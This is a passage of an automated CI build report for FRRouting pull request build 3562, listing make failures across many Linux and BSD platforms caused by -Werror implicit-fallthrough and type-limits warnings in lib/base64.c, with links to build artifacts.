errors\n\nUbuntu 16.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U16ARM8BUILD/config.log/config.log.gz\nUbuntu 16.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U16ARM8BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 18.04 amd64 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U1804AMD64/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nUbuntu 18.04 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U1804AMD64/config.status/config.status\nUbuntu 18.04 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U1804AMD64/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 18.04 i386 build: Failed (click for details)</summary>\nUbuntu 18.04 i386 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18I386BUILD/config.log/config.log.gz\nUbuntu 18.04 i386 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18I386BUILD/config.status/config.status\n\n__Make failed for Ubuntu 18.04 i386 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18I386BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\n</details>\n<details>\n<summary>Ubuntu 20.04 amd64 build: Failed (click for details)</summary>\nUbuntu 20.04 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U2004AMD64BUILD/config.status/config.status\n\n__Make failed for Ubuntu 20.04 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U2004AMD64BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nUbuntu 20.04 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U2004AMD64BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>NetBSD 9 amd64 build: Failed (click for details)</summary>\nNetBSD 9 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI012BUILD/config.log/config.log.gz\n\n__Make failed for NetBSD 9 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI012BUILD/ErrorLog/log_make.txt)\n\n    gmake[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function 'base64_encode_block':\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function 'base64_decode_block':\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nNetBSD 9 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI012BUILD/config.status/config.status\n</details>\n<details>\n<summary>Redhat 8 amd64 build: Failed (click for details)</summary>\nRedhat 8 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/REDHAT8/config.log/config.log.gz\n\n__Make failed for Redhat 8 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/REDHAT8/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nRedhat 8 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/REDHAT8/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 18.04 ppc64le build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 ppc64le build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U1804PPC64LEBUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_encode_block:\n\nUbuntu 18.04 ppc64le build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U1804PPC64LEBUILD/config.status/config.status\nUbuntu 18.04 ppc64le build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U1804PPC64LEBUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>FreeBSD 12 amd64 build: Failed (click for details)</summary>\n\n__Make failed for FreeBSD 12 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/FBSD12AMD64/ErrorLog/log_make.txt)\n\n    gmake[1]: Entering directory '/usr/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function 'base64_encode_block':\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function 'base64_decode_block':\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nFreeBSD 12 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/FBSD12AMD64/config.status/config.status\nFreeBSD 12 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/FBSD12AMD64/config.log/config.log.gz\n</details>\n<details>\n<summary>Fedora 29 amd64 build: Failed (click for details)</summary>\n\n__Make failed for Fedora 29 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/F29BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nFedora 29 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/F29BUILD/config.status/config.status\nFedora 29 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/F29BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>Debian 11 amd64 build: Failed (click for details)</summary>\nDebian 11 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/DEB11AMD64/config.status/config.status\n\n__Make failed for Debian 11 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/DEB11AMD64/ErrorLog/log_make.txt)\n\n    /home/ci/cibuild.3562/frr-source/doc/user/zebra.rst:1380: WARNING: duplicate clicmd description of debug zebra pbr, other instance in pbr\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nDebian 11 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/DEB11AMD64/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 18.04 arm7 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18ARM7BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_encode_block:\n\nUbuntu 18.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18ARM7BUILD/config.log/config.log.gz\nUbuntu 18.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18ARM7BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 18.04 arm8 build: Failed (click for details)</summary>\nUbuntu 18.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18ARM8BUILD/config.status/config.status\nUbuntu 18.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18ARM8BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 18.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_encode_block:\n\n</details>\n<details><summary>Successful on other platforms/tests</summary>\n\n- Ubuntu 16.04 i386 build\n- OpenBSD 7 amd64 build\n- Ubuntu 16.04 amd64 build\n- CentOS 7 amd64 build\n- Debian 9 amd64 build\n</details>\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n<details>\n<summary>Debian 10 amd64 build: Failed (click for details)</summary>\nDebian 10 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/DEB10BUILD/config.log/config.log.gz\n\n__Make failed for Debian 10 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/DEB10BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nDebian 10 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/DEB10BUILD/config.status/config.status\n</details>\n<details>\n<summary>FreeBSD 11 amd64 build: Failed (click for details)</summary>\n\n__Make failed for FreeBSD 11 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI009BUILD/ErrorLog/log_make.txt)\n\n    /usr/home/ci/cibuild.3562/frr-source/doc/user/zebra.rst:1380: WARNING: duplicate clicmd description of debug zebra pbr, other instance in pbr\n    lib/base64.c: In function 'base64_encode_block':\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function 'base64_decode_block':\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nFreeBSD 11 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI009BUILD/config.status/config.status\nFreeBSD 11 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI009BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 16.04 arm7 build: Failed (click for details)</summary>\nUbuntu 16.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI101BUILD/config.status/config.status\nUbuntu 16.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI101BUILD/config.log/config.log.gz\n\n__Make failed for Ubuntu 16.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI101BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\n</details>\n<details>\n<summary>Ubuntu 16.04 arm8 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 16.04 arm8 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U16ARM8BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    cc1: all warnings being treated as errors\n\nUbuntu 16.04 arm8 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U16ARM8BUILD/config.log/config.log.gz\nUbuntu 16.04 arm8 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U16ARM8BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 18.04 amd64 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U1804AMD64/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nUbuntu 18.04 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U1804AMD64/config.status/config.status\nUbuntu 18.04 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U1804AMD64/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 18.04 i386 build: Failed (click for details)</summary>\nUbuntu 18.04 i386 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18I386BUILD/config.log/config.log.gz\nUbuntu 18.04 i386 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18I386BUILD/config.status/config.status\n\n__Make failed for Ubuntu 18.04 i386 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18I386BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\n</details>\n<details>\n<summary>Ubuntu 20.04 amd64 build: Failed (click for details)</summary>\nUbuntu 20.04 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U2004AMD64BUILD/config.status/config.status\n\n__Make failed for Ubuntu 20.04 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U2004AMD64BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nUbuntu 20.04 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U2004AMD64BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>NetBSD 9 amd64 build: Failed (click for details)</summary>\nNetBSD 9 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI012BUILD/config.log/config.log.gz\n\n__Make failed for NetBSD 9 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI012BUILD/ErrorLog/log_make.txt)\n\n    gmake[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function 'base64_encode_block':\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function 'base64_decode_block':\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nNetBSD 9 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/CI012BUILD/config.status/config.status\n</details>\n<details>\n<summary>Redhat 8 amd64 build: Failed (click for details)</summary>\nRedhat 8 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/REDHAT8/config.log/config.log.gz\n\n__Make failed for Redhat 8 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/REDHAT8/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nRedhat 8 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/REDHAT8/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 18.04 ppc64le build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 ppc64le build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U1804PPC64LEBUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_encode_block:\n\nUbuntu 18.04 ppc64le build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U1804PPC64LEBUILD/config.status/config.status\nUbuntu 18.04 ppc64le build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U1804PPC64LEBUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>FreeBSD 12 amd64 build: Failed (click for details)</summary>\n\n__Make failed for FreeBSD 12 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/FBSD12AMD64/ErrorLog/log_make.txt)\n\n    gmake[1]: Entering directory '/usr/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function 'base64_encode_block':\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function 'base64_decode_block':\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nFreeBSD 12 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/FBSD12AMD64/config.status/config.status\nFreeBSD 12 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/FBSD12AMD64/config.log/config.log.gz\n</details>\n<details>\n<summary>Fedora 29 amd64 build: Failed (click for details)</summary>\n\n__Make failed for Fedora 29 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/F29BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nFedora 29 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/F29BUILD/config.status/config.status\nFedora 29 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/F29BUILD/config.log/config.log.gz\n</details>\n<details>\n<summary>Debian 11 amd64 build: Failed (click for details)</summary>\nDebian 11 amd64 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/DEB11AMD64/config.status/config.status\n\n__Make failed for Debian 11 amd64 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/DEB11AMD64/ErrorLog/log_make.txt)\n\n    /home/ci/cibuild.3562/frr-source/doc/user/zebra.rst:1380: WARNING: duplicate clicmd description of debug zebra pbr, other instance in pbr\n    lib/base64.c: In function base64_encode_block:\n    lib/base64.c:48:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:49:3: note: here\n    lib/base64.c:59:11: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:60:3: note: here\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:158:18: error: this statement may fall through [-Werror=implicit-fallthrough=]\n    lib/base64.c:159:3: note: here\n\nDebian 11 amd64 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/DEB11AMD64/config.log/config.log.gz\n</details>\n<details>\n<summary>Ubuntu 18.04 arm7 build: Failed (click for details)</summary>\n\n__Make failed for Ubuntu 18.04 arm7 build__:\n    (see full Make log at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18ARM7BUILD/ErrorLog/log_make.txt)\n\n    make[1]: Entering directory '/home/ci/cibuild.3562/frr-source'\n    lib/base64.c: In function base64_decode_value:\n    lib/base64.c:125:15: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_decode_block:\n    lib/base64.c:157:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:168:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:180:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c:192:22: error: comparison is always false due to limited range of data type [-Werror=type-limits]\n    lib/base64.c: In function base64_encode_block:\n\nUbuntu 18.04 arm7 build: Unknown Log <config.log.gz>\n    URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18ARM7BUILD/config.log/config.log.gz\nUbuntu 18.04 arm7 build: config.status output from configure script can be found at https://ci1.netdef.org/browse/FRR-PULLREQ2-3562/artifact/U18ARM7BUILD/config.status/config.status\n</details>\n<details>\n<summary>Ubuntu 18.04 arm8 build: Failed (click for details)</summary>\nUbuntu 18.04 arm8 build: config.status output from configure script can be found at 